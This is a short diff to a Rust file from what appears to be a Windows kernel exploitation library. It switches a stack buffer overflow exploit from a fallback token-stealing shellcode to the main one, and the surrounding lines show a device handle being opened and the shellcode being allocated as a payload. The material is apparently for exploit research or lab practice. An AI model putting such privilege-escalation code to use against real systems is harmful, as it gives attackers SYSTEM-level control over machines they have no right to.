@@ -1,7 +1,7 @@
 use core::ffi::c_void;
 use std::iter;
 
-use win_kexp::shellcode::token_stealing_shellcode_fallback;
+use win_kexp::shellcode::token_stealing_shellcode;
 use win_kexp::util::bytes_to_hex_string;
 use win_kexp::win32k::{
     allocate_shellcode, close_handle, create_cmd_process, get_device_handle, io_device_control,
@@ -21,7 +21,7 @@ fn exploit_stack_buffer_overflow() {
     println!("[+] Successfully opened device handle.");
 
     println!("[+] Building payload...");
-    let shellcode = token_stealing_shellcode_fallback();
+    let shellcode = token_stealing_shellcode();
     let (payload, payload_len) = allocate_shellcode(shellcode.as_ptr(), shellcode.len());
 
     let payload_address = payload as u64;
